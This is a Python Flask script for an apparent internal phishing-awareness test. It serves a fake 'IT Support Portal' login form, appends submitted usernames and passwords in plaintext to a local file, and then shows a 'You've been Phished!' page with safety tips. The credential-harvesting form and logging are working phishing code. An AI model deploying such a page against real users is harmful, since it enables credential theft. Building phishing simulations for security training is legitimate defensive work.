from flask import Flask, request, send_from_directory

app = Flask(__name__)

# Serve the phishing page (fake IT support login form)
@app.route('/')
def home():
    return '''
    <html>
    <head>
        <style>
            body {
                margin: 0;
                padding: 0;
                background-image: url('/static/background.jpg'); /* Background image from local machine */
                background-size: cover;
                font-family: Arial, sans-serif;
            }
            .container {
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                flex-direction: column;
                background-color: rgba(255, 255, 255, 0.8);  /* Transparent background for better readability */
                padding: 20px;
                border-radius: 10px;
                box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
            }
            .login-box {
                text-align: center;
                width: 400px;
                margin-bottom: 20px;
            }
            h2 {
                color: #333;
                font-size: 24px;
                margin-bottom: 20px;
            }
            input[type="text"], input[type="password"] {
                width: 100%;
                padding: 10px;
                margin: 10px 0;
                border: 1px solid #ccc;
                border-radius: 5px;
            }
            input[type="submit"] {
                background-color: #007bff;
                color: white;
                padding: 10px;
                border: none;
                border-radius: 5px;
                cursor: pointer;
                width: 100%;
            }
            input[type="submit"]:hover {
                background-color: #0056b3;
            }
            .links {
                margin-top: 20px;
            }
            .links a {
                text-decoration: none;
                color: #007bff;
                margin: 0 15px;
            }
            .links a:hover {
                text-decoration: underline;
            }
            .tips {
                margin-top: 30px;
                font-size: 14px;
                color: #555;
            }
            .tips ul {
                list-style-type: none;
                padding: 0;
            }
            .tips ul li {
                margin: 10px 0;
            }
            .tips a {
                color: #007bff;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="login-box">
                <h2>IT Support Portal</h2>
                <p>Please log in to continue</p>
                <form method="post" action="/login">
                    <input type="text" name="username" placeholder="Enter your username" required><br>
                    <input type="password" name="password" placeholder="Enter your password" required><br>
                    <input type="submit" value="Log In">
                </form>
            </div>
            <div class="links">
                <a href="#">Forgot Password?</a>
                <a href="#">Contact Support</a>
                <a href="#">Security Tips</a>
            </div>
            <div class="tips">
            </div>
        </div>
    </body>
    </html>
    '''

# Route to capture and log credentials
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    # Log the captured username and password to a file
    with open('captured_credentials.txt', 'a') as f:
        f.write(f'Username: {username}, Password: {password}\n')

    # Display phishing test failure message with tips
    return '''
    <html>
    <head>
        <style>
            body {
                margin: 0;
                padding: 0;
                background-image: url('/static/fail_background.jpg'); /* Background image for the failure page */
                background-size: cover;
                font-family: Arial, sans-serif;
            }
            .container {
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                flex-direction: column;
                background-color: rgba(255, 255, 255, 0.8);  /* Transparent background for better readability */
                padding: 20px;
                border-radius: 10px;
                box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
                text-align: center;
            }
            h2 {
                color: red;
                font-size: 24px;
                margin-bottom: 20px;
            }
            img {
                width: 150px;
                height: auto;
                margin-bottom: 20px;
            }
            .tips {
                font-size: 16px;
                color: #333;
            }
            .tips ul {
                list-style-type: none;
                padding: 0;
            }
            .tips ul li {
                margin: 10px 0;
            }
            .tips a {
                color: #007bff;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>You’ve been Phished!</h2>
            <h2>This was a test phishing attempt performed by an internal cybersecurty team</h2>
            <img src="/static/warning_image.jpg" alt="Warning">  <!-- You can replace this with any local image -->
            <p>It's okay, mistakes happen! But next time, follow these tips to stay safe:</p>
            <div class="tips">
                <ul>
                    <li>1. Double-check the URL before entering your credentials.</li>
                    <li>2. Avoid clicking on suspicious links.</li>
                    <li>3. Be cautious of emails asking for sensitive information.</li>
                    <li>4. Stay informed on phishing prevention techniques.</li>
                </ul>
                <p>For more information, visit <a href="https://www.occ.gov/topics/consumers-and-communities/consumer-protection/fraud-resources/phishing-attack-prevention.html" target="_blank">this guide on phishing prevention.</a></p>
            </div>
        </div>
    </body>
    </html>
    '''

# Serve the logo image and background from the local static folder
@app.route('/static/<path:filename>')
def static_files(filename):
    return send_from_directory('static', filename)

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)  # Accessible locally and on your network

